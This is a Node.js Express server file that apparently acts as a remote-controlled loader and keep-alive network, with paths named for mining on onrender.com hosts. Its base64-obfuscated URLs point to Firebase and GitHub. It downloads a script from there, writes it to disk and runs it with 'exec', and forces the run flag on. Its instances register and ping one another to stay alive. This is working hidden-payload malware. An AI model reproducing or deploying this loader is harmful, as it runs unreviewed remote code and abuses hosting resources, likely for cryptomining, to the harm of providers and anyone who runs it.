const { exec } = require("node:child_process")
const express = require('express')
const axios = require('axios')
const fs = require('fs')

let RUN = false

let mID = null
let mUrl = null
let mNextId = null

let mServer = false
let mServerUrl = null
let mInstall = []
let mProcess = null

let mUpdateUrl = new Date().getTime()+21600000

let mStart = new Date().toString()

let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')

const app = express()

app.use(express.json())

app.listen(process.env.PORT || 8080, ()=> {
    console.log('Listening on port 8080')
})



async function startWorker() {

    await checkServer()
    
    await updateStatus()

    while (true) {
        await delay(60000)
        await updateServer()
        await delay(120000)
    }
}

async function updateStatus() {
    if (mID) {
        try {
            await axios.get('https://'+mID+'.onrender.com/check')       
        } catch (error) {}
    }
}

async function updateServer() {
    if (mID) {
        if (mUrl == null || mUpdateUrl < new Date().getTime()) {
            try {
                let response = await axios.get(BASE_URL+'mining/server/'+mID+'/url.json')
                
                let data = response.data
                if (data != null && data != 'null') {
                    mUrl = data
                    mUpdateUrl = new Date().getTime()+21600000
                }
            } catch (error) {}
        }

        if (mUrl) {
            try {
                await axios.get('https://'+mUrl+'.onrender.com/worker?url='+mUrl)
            } catch (error) {}

            try {
                await axios.post(STORAGE+encodeURIComponent('mining/server/'+mID+'.json'), '', {
                    headers: {
                        'Content-Type':'active/'+parseInt(new Date().getTime()/1000)
                    },
                    maxBodyLength: Infinity,
                    maxContentLength: Infinity
                })
            } catch (error) {}
        } else {
            if (mNextId == null) {
                try {
                    let response = await axios.get(BASE_URL+'mining/next/url.json')
                    
                    let data = response.data
                    if (data != null && data != 'null') {
                        mNextId = data
                    }
                } catch (error) {}

                if (mNextId && mNextId != mID) {
                    try {
                        await axios.patch(BASE_URL+'mining/next.json', JSON.stringify({ url:mID }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })
                    } catch (error) {}

                    try {
                        await axios.patch(BASE_URL+'mining/server/'+mNextId+'.json', JSON.stringify({ url:mID }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })
                    } catch (error) {}
                }
            }
        }

        await checkServer()
    }
}

async function checkServer() {
    try {
        let response = await axios.get(decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhaXlhbjA4OC9wdWJsaWMvbWFpbi9zZXJ2ZXIuanNvbg=='))
        let data = response.data
        
        mServer = data['status']
        mServerUrl = data['url']
        mInstall = data['install']
    } catch (error) {
        try {
            let response = await axios.get(STORAGE+encodeURIComponent('server.json'))
            let contentType = response.data['contentType']
            let data = JSON.parse(decode(contentType.replace('base64/', '')))
            
            mServer = data['status']
            mServerUrl = data['url']
            mInstall = data['install']
        } catch (error) {}
    }

    mServer = true

    if (mServer && !RUN) {
        try {
            let response = await axios.get(mServerUrl, {responseType: 'blob'})
            if (response.data) {
                fs.writeFileSync('script.js', response.data)

                await startScript()

                console.log('start')
            }
        } catch (error) {}
    }
}

async function startScript() {
    await stopScript()

    mProcess = exec('node script.js')

    mProcess.stdout.on('data', (data) => {})

    mProcess.stderr.on('data', (data) => {
        console.log('error')
    })
}

async function stopScript() {
    try {
        if (mProcess) {
            mProcess.stdout.destroy()
            mProcess.stderr.destroy()
            mProcess.kill()
        }
    } catch (error) {}
}

function encode(data) {
    return Buffer.from(data).toString('base64')
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

app.get('/', async (req, res) => {
    if (mID == null) {
        try {
            let url = req.query.url
            if (!url) {
                let host = req.hostname
                if (host.endsWith('onrender.com')) {
                    url = host.replace('.onrender.com', '')
                }
            }
    
            if (url && url != 'localhost') {
                mID = url
            }
        } catch (error) {}
    }

    res.end(''+mStart)
})

app.get('/worker', async (req, res) => {
    try {
        let url = req.query.url
        if (!url) {
            let host = req.hostname
            if (host.endsWith('onrender.com')) {
                url = host.replace('.onrender.com', '')
            }
        }

        if (url && url != 'localhost') {
            mID = url
        }
    } catch (error) {}

    res.end('ok')
})

app.get('/check', async (req, res) => {
    res.end('ok')
})


function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
